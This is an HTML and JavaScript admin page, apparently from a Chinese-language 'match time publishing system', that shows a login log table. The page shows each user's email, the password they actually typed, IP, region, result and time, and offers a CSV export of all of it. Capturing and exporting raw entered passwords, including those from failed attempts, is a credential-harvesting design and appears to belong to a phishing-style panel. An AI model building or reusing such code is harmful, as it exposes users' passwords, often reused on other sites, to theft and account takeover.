<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>登录日志｜长相思匹配时间发布系统</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,"Segoe UI","PingFang SC",Roboto,sans-serif}
body{background:linear-gradient(160deg,#e9f8ef 0%,#f6fcf8 55%,#edfaf2 100%);min-height:100vh;padding:24px 16px}
.container{max-width:1000px;margin:0 auto}
.head{text-align:center;margin-bottom:20px}
.head h1{color:#2a6b4e;font-size:26px}
.head .sub{color:#6d9480;font-size:13.5px;margin-top:6px}
.toolbar{text-align:right;margin-bottom:12px}
.btn{display:inline-block;padding:10px 20px;border-radius:99px;border:none;background:linear-gradient(135deg,#56c98a,#34a76c);color:#fff;font-size:14px;font-weight:600;cursor:pointer;text-decoration:none;box-shadow:0 5px 15px rgba(74,179,122,0.22)}
.btn.plain{background:#fff;color:#2a6b4e;border:1px solid #b8e0ca;box-shadow:none}
.btn.danger{background:linear-gradient(135deg,#c98a7a,#a56350)}
.table-wrap{background:#fff;border-radius:14px;overflow:auto;box-shadow:0 3px 12px rgba(84,168,125,0.1)}
table{width:100%;border-collapse:collapse;min-width:820px}
th,td{padding:11px 10px;text-align:left;border-bottom:1px solid #e2f3e9;font-size:13.5px;white-space:nowrap}
th{background:#eef9f2;color:#2a6b4e}
tr:hover td{background:#f4fcf7}
.ok{color:#1f9d5d;font-weight:700}
.fail{color:#c0392b;font-weight:700}
.nav-row{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;margin-top:26px}
.empty{text-align:center;color:#88a896;padding:30px}
</style>
</head>
<body>
<div class="container">
  <div class="head"><h1>用户登录日志</h1><div class="sub" id="logUser"></div></div>
  <div class="toolbar"><button class="btn" onclick="exportCsv()">导出 Excel(CSV)</button></div>
  <div class="table-wrap"><table>
    <thead><tr><th>登录账号邮箱</th><th>输入密码</th><th>登录IP</th><th>国家/地区</th><th>登录结果</th><th>登录时间</th></tr></thead>
    <tbody id="logBody"><tr><td colspan="6" class="empty">正在加载...</td></tr></tbody>
  </table></div>
  <div class="nav-row"><a class="btn plain" href="./index.html">返回首页</a><button class="btn danger" onclick="logout()">退出登录</button></div>
</div>

<script>
let token = localStorage.getItem('sb_token');
if(!token){ window.location.href='./login.html'; }
let logs = [];

async function load(){
  const res = await fetch('/api/user',{headers:{Authorization:'Bearer '+token}});
  if(!res.ok){ logout(); return; }
  const user = await res.json();
  document.getElementById('logUser').textContent = '当前管理员：'+user.email;
  if(!user.isAdmin){ alert('无权限'); window.location.href='./index.html'; return; }
  loadLogs();
}
async function loadLogs(){
  const res = await fetch('/api/login-logs',{headers:{Authorization:'Bearer '+token}});
  if(!res.ok){ document.getElementById('logBody').innerHTML='<tr><td colspan="6" class="empty">读取失败</td></tr>'; return; }
  logs = await res.json();
  render();
}
function render(){
  const body = document.getElementById('logBody');
  if(!logs.length){ body.innerHTML='<tr><td colspan="6" class="empty">暂无登录记录</td></tr>'; return; }
  body.innerHTML = logs.map(r=>`
    <tr>
      <td>${esc(r.email)}</td><td>${esc(r.input_pwd||'')}</td><td>${esc(r.ip||'')}</td><td>${esc(r.area||'')}</td>
      <td class="${r.status==='success'?'ok':'fail'}">${r.status==='success'?'登录成功':'登录失败'}</td>
      <td>${new Date(r.created_at).toLocaleString('zh-CN',{hour12:false})}</td>
    </tr>`).join('');
}
function exportCsv(){
  if(!logs.length){ alert('暂无数据可导出'); return; }
  const head='登录账号邮箱,输入密码,登录IP地址,国家/地区,登录结果,登录时间';
  const rows=logs.map(r=>[r.email,r.input_pwd||'',r.ip||'',r.area||'',r.status==='success'?'登录成功':'登录失败',new Date(r.created_at).toLocaleString('zh-CN',{hour12:false})].map(esc).join(','));
  const blob=new Blob(['\uFEFF'+[head,...rows].join('\r\n')],{type:'text/csv;charset=utf-8;'});
  const a=document.createElement('a'); a.href=URL.createObjectURL(blob);
  a.download='登录日志_'+new Date().toISOString().slice(0,10)+'.csv'; a.click();
}
function esc(s){ return String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
function logout(){ localStorage.removeItem('sb_token');window.location.href='./login.html'; }
load();
</script>
</body>
</html>
